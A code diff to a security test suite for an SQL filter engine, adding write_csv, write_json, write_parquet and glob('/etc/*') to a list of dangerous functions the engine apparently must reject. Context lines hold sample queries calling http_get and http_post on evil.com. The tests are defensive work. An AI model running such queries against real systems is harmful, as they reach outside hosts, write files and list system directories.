@@ -141,6 +141,10 @@ describe("SqlFilterEngine Security", () => {
       { fn: "read_parquet", sql: "SELECT * FROM read_parquet('/tmp/data.parquet')" },
       { fn: "http_get", sql: "SELECT * FROM http_get('http://evil.com')" },
       { fn: "http_post", sql: "SELECT * FROM http_post('http://evil.com', '')" },
+      { fn: "write_csv", sql: "SELECT * FROM write_csv((SELECT 1), '/tmp/out.csv')" },
+      { fn: "write_json", sql: "SELECT * FROM write_json((SELECT 1), '/tmp/out.json')" },
+      { fn: "write_parquet", sql: "SELECT * FROM write_parquet((SELECT 1), '/tmp/out.parquet')" },
+      { fn: "glob", sql: "SELECT * FROM glob('/etc/*')" },
     ];
 
     for (const { fn, sql } of dangerousFunctions) {
